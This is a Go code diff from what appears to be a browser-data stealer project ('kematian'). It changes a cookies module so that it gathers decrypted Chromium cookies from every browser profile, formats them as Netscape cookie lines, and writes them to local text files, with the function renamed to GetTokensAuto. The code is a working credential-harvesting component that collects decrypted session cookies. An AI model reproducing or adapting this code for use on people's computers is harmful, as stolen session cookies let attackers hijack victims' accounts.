@@ -2,12 +2,19 @@ package cookies
 
 import (
 	"database/sql"
+	"os"
+
 	"kdot/kematian/browsers/chromium/structs"
 	"kdot/kematian/decryption"
 )
 
-func GetCookiesAuto(browsersList []structs.Browser) []structs.CookiesOutput {
-	var cookies []structs.CookiesOutput
+type CookiesOutput struct {
+	browserName string
+	cookies     string
+}
+
+func GetTokensAuto(browsersList []structs.Browser) {
+	var cookies []CookiesOutput
 	for _, browser := range browsersList {
 		var cookiesFound = ""
 		for _, profile := range browser.Profiles {
@@ -48,7 +55,10 @@ func GetCookiesAuto(browsersList []structs.Browser) []structs.CookiesOutput {
 				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path_this + "\t" + name + "\t" + decrypted + "\t" + expired + "\n"
 			}
 		}
-		cookies = append(cookies, structs.CookiesOutput{BrowserName: browser.ProfilePath, Cookies: cookiesFound})
+		cookies = append(cookies, CookiesOutput{browser.ProfilePath, cookiesFound})
 	}
-	return cookies
+	for _, cookie := range cookies {
+		fileName := "cookies_netscape_" + cookie.browserName + ".txt"
+		os.WriteFile(fileName, []byte(cookie.cookies), 0644)
+	}
 }
